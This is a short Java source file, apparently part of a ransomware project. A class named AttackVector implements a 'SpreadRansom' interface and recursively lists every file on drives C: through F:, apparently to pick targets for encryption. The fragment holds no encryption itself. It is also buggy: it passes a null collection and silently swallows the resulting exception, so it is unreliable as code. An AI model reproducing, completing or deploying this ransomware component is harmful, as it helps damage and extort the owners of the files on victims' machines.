package Attack;

import java.io.File;
import java.util.Collection;


import SpreadR.SpreadRansom;

public class AttackVector implements SpreadRansom {
	private Collection<File> _folderTree;

	private boolean isVisitedFolder() {
		return false;

	}

	public void listf(String directoryName, Collection<File> files) {
		File directory = new File(directoryName);

		// Get all files from a directory.
		File[] fList = directory.listFiles();
		if (fList != null)
			for (File file : fList) {
				if (file.isFile()) {
					try {
						files.add(file);
					} catch (NullPointerException e) {

					}
				} else if (file.isDirectory()) {
					listf(file.getAbsolutePath(), files);
					System.out.println("\n");
				}
				System.out.println(file.getName());
			}
	}

	@Override
	public void spread() {

		Collection<File> listOfFiles = null;
		listf("C:\\", listOfFiles);
		listf("D:\\", listOfFiles);
		listf("E:\\", listOfFiles);
		listf("F:\\", listOfFiles);
	}

}
